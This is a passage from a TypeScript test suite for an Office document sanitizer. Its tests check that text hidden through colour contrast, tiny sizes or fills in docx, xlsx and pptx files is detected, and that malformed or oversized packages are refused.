      [],
    )
    expect(word.counted).toEqual({ 'colour-contrast': 1, 'too-small': 1 })
  })

  // Finding 5: a docx text box fill is the background of its text. The
  // grey-on-grey run counts once the box's fill resolves; before that it
  // read as grey-on-white, visibly distinct.
  it('a docx text box fill is the background of its text', async () => {
    const box = (fill: string, runs: string) =>
      `<w:r><w:drawing><wp:inline><wp:docPr id="7" name="d"/><a:graphic>` +
      '<a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">' +
      `<wps:wsp><wps:spPr>${fill}</wps:spPr><wps:txbx><w:txbxContent>${runs}</w:txbxContent></wps:txbx></wps:wsp>` +
      '</a:graphicData></a:graphic></wp:inline></w:drawing></w:r>'
    const grey = '<a:solidFill><a:srgbClr val="333333"/></a:solidFill>'
    const body =
      para('VISIBLE') +
      `<w:p>${box(grey, `<w:p>${run('SECRETBOXTEXT', '<w:color w:val="333333"/>')}</w:p>`)}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  // Finding 6: a shading's theme-named colours resolve like w:color's.
  it('w:shd theme colours resolve through the theme like w:color theme colours', async () => {
    const body =
      `<w:p><w:pPr><w:shd w:val="clear" w:themeFill="text1"/></w:pPr>${run('SECRETTHEMEFILL', '<w:color w:val="000000"/>')}</w:p>` +
      `<w:p><w:pPr><w:shd w:val="clear" w:themeFill="background1"/></w:pPr>${run('ONTHEMEWHITE', '<w:color w:val="000000"/>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [], 'ONTHEMEWHITE')
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  // Finding 7: a solid shading draws its pattern colour: absent reads as black.
  it('a solid shading with an absent pattern colour draws black, never the fill', async () => {
    const body =
      `<w:p>${run('VISIBLE')}</w:p>` +
      `<w:p><w:pPr><w:shd w:val="solid" w:fill="FFFFFF"/></w:pPr>${run('SECRETSOLIDNOVAL', '<w:color w:val="000000"/>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  // Finding 8: a dxf fill with no patternType is solid, and bgColor is read.
  it('xlsx: a dxf fill with no patternType is solid, and bgColor resolves beside fgColor', async () => {
    // The dxf form Excel writes: bgColor only, no patternType, over a black
    // base font — the #482 reading the rewrite dropped.
    const dxfStyles =
      `<styleSheet xmlns="${NS.s}"><fonts><font><color rgb="FF000000"/></font></fonts>` +
      '<fills><fill><patternFill patternType="none"/></fill></fills>' +
      '<cellXfs><xf numFmtId="0" fontId="0" fillId="0"/></cellXfs>' +
      '<dxfs><dxf><fill><patternFill><bgColor rgb="FF000000"/></patternFill></fill></dxf></dxfs></styleSheet>'
    const dxfSheet =
      `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` +
      '<conditionalFormatting sqref="A1"><cfRule type="expression" dxfId="0" priority="1">' +
      '<formula>TRUE()</formula></cfRule></conditionalFormatting>'
    const dxf = await disarmed(
      xlsx({ sheets: [{ name: 'S', xml: dxfSheet }], styles: dxfStyles }),
      MIME.xlsx,
      [],
    )
    expect(dxf.counted).toEqual({ 'colour-contrast': 1 })
    // A base solid fill that names only its bgColor resolves that colour.
    const base = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: cells495([
              [0, 'VISIBLE', 'A1'],
              [1, 'SECRETBGONLY', 'B1'],
            ]),
          },
        ],
        styles: sStyles({
          fonts: ['<font><sz val="11"/><color rgb="FF404040"/></font>'],
          fills: [
            '<fill><patternFill patternType="none"/></fill>',
            '<fill><patternFill patternType="solid"><bgColor rgb="FF404040"/></patternFill></fill>',
          ],
          xfs: [xf495(0, 0, 0), xf495(0, 0, 1)],
        }),
      }),
      MIME.xlsx,
      [],
    )
    expect(base.counted).toEqual({ 'colour-contrast': 1 })
  })

  // Finding 1, the conditional-format half: an automatic dxf font renders
  // black too, and over its own dark fill it cannot contrast.
  it('an automatic conditional-format font renders black: over its dark fill it counts', async () => {
    // The base font is white, so nothing but the dxf's own automatic (black)
    // font over its black fill can hide anything here.
    // The only declared font is the white base, carried by a cell that sits
    // on a dark fill so it is visibly distinct — so nothing can count except
    // the dxf's own automatic (black) font over its own black fill.
    const styles =
      `<styleSheet xmlns="${NS.s}"><fonts><font><color rgb="FFFFFFFF"/></font></fonts>` +
      '<fills><fill><patternFill patternType="none"/></fill>' +
      '<fill><patternFill patternType="solid"><fgColor rgb="FF404040"/></patternFill></fill></fills>' +
      '<cellXfs><xf numFmtId="0" fontId="0" fillId="1"/></cellXfs>' +
      '<dxfs><dxf><font><color auto="1"/></font><fill><patternFill patternType="solid">' +
      '<fgColor rgb="FF000000"/></patternFill></fill></dxf></dxfs></styleSheet>'
    const sheet =
      `<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>VISIBLE</t></is></c></row></sheetData>` +
      '<conditionalFormatting sqref="A1"><cfRule type="expression" dxfId="0" priority="1">' +
      '<formula>TRUE()</formula></cfRule></conditionalFormatting>'
    const out = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }], styles }), MIME.xlsx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  // Finding 9: a fill entry carrying more than its patternFill is not provably
  // any colour (Excel 2010+ gradients ride in extLst as x14:fill).
  it('xlsx: a fill entry with more than its patternFill is not provably any colour', async () => {
    const X14 = 'http://schemas.microsoft.com/office/spreadsheetml/2009/9/main'
    const gradient =
      `<fill><patternFill patternType="none"/><extLst><ext xmlns:x14="${X14}" uri="{78C0D931-6777-43EE-B60F-DE7C84584A24}">` +
      '<x14:fill><x14:gradientFill><x14:stop position="0"><x14:color rgb="FF404040"/></x14:stop>' +
      '<x14:stop position="1"><x14:color rgb="FF404040"/></x14:stop></x14:gradientFill></x14:fill>' +
      '</ext></extLst></fill>'
    const out = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: cells495([
              [0, 'VISIBLE', 'A1'],
              [1, 'SECRETX14FILL', 'B1'],
            ]),
          },
        ],
        styles: sStyles({
          fonts: ['<font><sz val="11"/><color rgb="FF404040"/></font>'],
          fills: ['<fill><patternFill patternType="none"/></fill>', gradient],
          xfs: [xf495(0, 0, 0), xf495(0, 0, 1)],
        }),
      }),
      MIME.xlsx,
      [],
    )
    expect(out.counted).toEqual({ 'unknown-property': 1 })
  })

  // The reviewer's minors: w:highlight "none" is no highlight; vertAlign
  // composes with the size as w:w does.
  it('w:highlight val="none" is no highlight, and vertAlign composes with the size', async () => {
    const body =
      `<w:p>${run('VISIBLE')}${run('NONESHADECONTROL', '<w:color w:val="000000"/><w:highlight w:val="none"/>')}</w:p>` +
      `<w:p>${run('SECRETSUPERTINY', '<w:sz w:val="3"/><w:vertAlign w:val="superscript"/>')}${run('SUPCONTROL', '<w:sz w:val="3"/>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(out.counted).toEqual({ 'too-small': 1 })
  })

  // The reviewer's fillRef reconciliation: idx 0 applies no fill — the slide
  // shows through — so a plain run in such a shape is not unknown-property.
  it('a fillRef idx of 0 applies no fill: the background beneath shows through', async () => {
    const fillRef0 =
      '<p:style><a:lnRef idx="1"><a:schemeClr val="accent1"/></a:lnRef>' +
      '<a:fillRef idx="0"><a:schemeClr val="accent1"/></a:fillRef>' +
      '<a:effectRef idx="0"><a:schemeClr val="accent1"/></a:effectRef><a:fontRef idx="minor"/></p:style>'
    const out = await disarmed(
      pptx({
        slides: [
          { shapes: shape('IDXZEROCONTROL', { id: 3, style: fillRef0 }) + shape('VISIBLE') },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({})
  })
})

describe('#482 F7 (A11): a deleted table cell is a deletion', () => {
  it('F4: a w:tc marked w:cellDel goes with its text', async () => {
    const body =
      '<w:tbl><w:tblGrid><w:gridCol/><w:gridCol/></w:tblGrid><w:tr>' +
      `<w:tc>${para('VISIBLE')}</w:tc>` +
      `<w:tc><w:tcPr><w:cellDel w:id="1" w:author="a"/></w:tcPr>${para('F4SENTINEL')}</w:tc></w:tr></w:tbl>`
    const out = await disarmed(docx({ body }), MIME.docx, ['F4SENTINEL'])
    expect(out.removed.deletions).toBe(1)
  })
})

describe('#482 F8: an unwrap carries only the declarations a child uses', () => {
  it('a w:ins with 200 declarations around a run with 100 attributes still reopens', async () => {
    const decls = Array.from({ length: 200 }, (_, i) => `xmlns:n${i}="urn:n${i}"`).join(' ')
    const attrs = Array.from({ length: 100 }, (_, i) => `a${i}=""`).join(' ')
    const body = `<w:p><w:ins w:id="1" w:author="a" ${decls}><w:r ${attrs}><w:t>VISIBLE</w:t></w:r></w:ins></w:p>`
    const doc = await flattenDocument(
      { bytes: docx({ body }), filename: 'x', mimeType: MIME.docx },
      { convert: async () => 'VISIBLE', disarm: ooxmlDisarm },
    )
    expect(doc.report.hiddenContent).toBe('removed')
  })
})

describe('the disarm throws instead of returning a partial package', () => {
  const W_EMPTY = `<w:document xmlns:w="${NS.w}"><w:body/></w:document>`

  it('an unsupported type', async () => {
    const dotx = 'application/vnd.openxmlformats-officedocument.wordprocessingml.template'
    expect(await refusalOf(ooxmlDisarm(docx({ body: para('x') }), dotx))).toBe('unsupported-type')
  })

  it('no main part: no officeDocument relationship, or one whose target is missing (F12)', async () => {
    const none = buildPackage({
      main: { name: 'word/document.xml', type: CT.docxMain, body: W_EMPTY },
      officeDocument: null,
    })
    const missing = buildPackage({
      main: { name: 'word/other.xml', type: CT.docxMain, body: W_EMPTY },
      officeDocument: 'word/document.xml',
    })
    expect(await refusalOf(ooxmlDisarm(none, MIME.docx))).toBe('no-main-part')
    expect(await refusalOf(ooxmlDisarm(missing, MIME.docx))).toBe('no-main-part')
  })

  it('a main part elsewhere, of another type, or of another package type (F12)', async () => {
    const elsewhere = buildPackage({
      main: { name: 'word/other.xml', type: CT.docxMain, body: W_EMPTY },
    })
    const wrongType = buildPackage({
      main: { name: 'word/document.xml', type: CT.xlsxMain, body: W_EMPTY },
    })
    expect(await refusalOf(ooxmlDisarm(elsewhere, MIME.docx))).toBe('content-type')
    expect(await refusalOf(ooxmlDisarm(wrongType, MIME.docx))).toBe('content-type')
    expect(await refusalOf(ooxmlDisarm(docx({ body: para('x') }), MIME.xlsx))).toBe('content-type')
    expect(await refusalOf(ooxmlDisarm(docx({ body: para('x') }), MIME.docm))).toBe('content-type')
    expect(
      await refusalOf(ooxmlDisarm(docx({ body: para('x'), macroEnabled: true }), MIME.docx)),
    ).toBe('content-type')
  })

  it('two relationships with one Id in a kept part', async () => {
    const bytes = docx({
      body: para('x'),
      styles: wStyles(''),
      docRels: [{ id: 'rIdStyles', type: RT.theme, target: 'theme/theme1.xml' }],
    })
    expect(await refusalOf(ooxmlDisarm(bytes, MIME.docx))).toBe('content-type')
  })

  it('a relationships part, or the content types, over 1 MiB (A1)', async () => {
    // Pseudo-random padding: a repeated letter would deflate past the reader's
    // 100:1 ratio and be refused there, before this check is reached.
    const pad = noise(1024 * 1024)
    const bigRels = docx({
      body: para('x'),
      docRels: [{ id: 'rIdPad', type: RT.settings, target: `${pad}.xml` }],
    })
    expect(await refusalOf(ooxmlDisarm(bigRels, MIME.docx))).toBe('content-type')
    const bigTypes = buildPackage({
      main: { name: 'word/document.xml', type: CT.docxMain, body: W_EMPTY },
      parts: [{ name: 'pad.xml', type: `application/x-${pad}`, body: '<r/>' }],
    })
    expect(await refusalOf(ooxmlDisarm(bigTypes, MIME.docx))).toBe('content-type')
  })

  it('a zip limit refuses through the S5 reader', async () => {
    const bytes = docx({ body: para('x') })
    expect(await refusalOf(ooxmlDisarm(bytes.slice(0, bytes.length - 1), MIME.docx))).toBe(
      'eocd' satisfies ZipRefusal,
    )
  })

  it('a kept part over the tree budget refuses with xml-nodes (A1)', async () => {
    // Each paragraph is two nodes (the element and its attribute), and the
    // numbers keep the part under the reader's 100:1 ratio once deflated.
    const half = XML_LIMITS.maxTreeNodes / 2
    const body = Array.from({ length: half + 1 }, (_, i) => `<w:p n="${i}"/>`).join('')
    expect(await refusalOf(ooxmlDisarm(docx({ body }), MIME.docx))).toBe('xml-nodes')
  })

  it('a disarm throw makes Sanitize unavailable; the raw file is never the fallback', async () => {
    const convert = vi.fn(async () => 'never')
    const bytes = docx({
      body: para('x'),
      styles: wStyles(''),
      docRels: [{ id: 'rIdStyles', type: RT.theme, target: 'theme/theme1.xml' }],
    })
    let thrown: unknown
    try {
      await flattenDocument(
        { bytes, filename: 'x', mimeType: MIME.docx },
        { convert, disarm: ooxmlDisarm },
      )
    } catch (err) {
      thrown = err
    }
    expect(thrown).toBeInstanceOf(DocumentRefusedError)
    expect(convert).not.toHaveBeenCalled()
    expect(sanitizeOptionFor({ error: thrown }).unavailable).toBeDefined()
  })
})
